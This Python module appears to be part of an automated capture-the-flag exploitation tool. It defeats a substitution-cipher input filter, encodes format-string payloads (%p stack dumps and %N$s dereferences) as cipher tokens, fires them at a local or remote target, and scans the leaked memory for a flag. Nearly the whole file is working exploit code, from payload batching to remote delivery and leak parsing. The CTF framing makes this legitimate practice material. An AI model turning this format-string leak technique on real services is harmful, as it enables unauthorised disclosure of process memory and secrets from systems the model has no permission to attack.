"""cipher-fmt: a substitution cipher whose decoded output feeds a printf format.

Some challenges (e.g. the emoji cipher) look like a decoder but are really a
format-string pwn: the program does `printf(decode(your_input))`, so the decoded
bytes are the format string. The twist is the input filter -- you can only send
tokens the table knows -- but the table covers printable ASCII, which is exactly
what a `%p`/`%s` payload needs.

This strategy ties the two halves together automatically: it reconstructs the
table, encodes a format-string leak as tokens, fires it at the (local or remote)
target, and reads the flag out of the leak -- so a single run solves it:

    python3 autoscram.py ./emoji_cipher --remote host:port --yes
"""
import re

from .base import Strategy
from .. import report
from ..comms import connect
from .subcipher import build_encoder, locate_table

_BATCH = 12          # format specifiers per request (keep decoded len < buffer)
_MAXOFF = 60         # how many stack slots to probe


class CipherFormatString(Strategy):
    name = "cipher-fmt"
    desc = "decode-then-printf: leak the flag with a token-encoded format string"
    verifiable = False               # flag lives on the target, not in a sentinel

    def detect(self, ctx):
        if not ctx.analysis.fmt_leaks:
            return 0, "no printf-as-format-string sink"
        addr, how = locate_table(ctx.binary)
        if addr is None:
            return 0, "no substitution table"
        return 85, f"decoded cipher output flows into printf ({how})"

    def run(self, ctx, io):
        try:
            io.close()               # we drive our own (re)connections
        except Exception:
            pass

        emojify, mapping = build_encoder(ctx.binary)
        if emojify is None or not mapping:
            report.warn("cipher-fmt: could not reconstruct the table")
            return None
        report.ok(f"table rebuilt ({len(mapping)} tokens); the decoded text is "
                  "used as a printf format string")

        target = getattr(ctx, "remote_target", None)
        flag_re = ctx.flag_re
        pat = re.compile(flag_re.encode() if isinstance(flag_re, str) else flag_re)

        def leak(ascii_payload):
            """Fresh connection per payload so a bad deref can't kill a scan."""
            try:
                conn = connect(ctx.binary.path, target)
            except Exception as e:
                report.warn(f"connect failed: {e}")
                return b""
            try:
                conn.sendline(emojify(ascii_payload))
                return conn.recvline(timeout=4)
            except Exception:
                return b""
            finally:
                try:
                    conn.close()
                except Exception:
                    pass

        # ---- 1) %p stack dump (safe: never dereferences) ----
        report.step("Leaking the stack via %p (token-encoded)...")
        slots = {}
        for start in range(1, _MAXOFF + 1, _BATCH):
            payload = ".".join(f"%{i}$p" for i in range(start, start + _BATCH))
            out = leak(payload)
            for j, tok in enumerate(out.split(b".")):
                tok = tok.strip()
                if tok.startswith(b"0x"):
                    try:
                        slots[start + j] = int(tok, 16).to_bytes(8, "little")
                    except ValueError:
                        pass
            blob = b"".join(slots[k] for k in sorted(slots))
            m = pat.search(blob)
            if m:
                flag = m.group(0).decode(errors="replace")
                report.ok(f"FLAG (stack leak): {flag}")
                return flag

        # ---- 2) %N$s scan (dereference each slot as a string) ----
        report.step("No flag on the raw stack; scanning %N$s pointers...")
        for i in range(1, _MAXOFF + 1):
            out = leak(f"%{i}$s")
            m = pat.search(out)
            if m:
                flag = m.group(0).decode(errors="replace")
                report.ok(f"FLAG (%{i}$s): {flag}")
                return flag

        report.warn("No flag via format-string leak. Printable stack strings:")
        for off in sorted(slots):
            b = slots[off].rstrip(b"\x00")
            if b and all(0x20 <= c < 0x7f for c in b):
                report.info(f"  %{off}$p -> {b.decode()!r}")
        return None
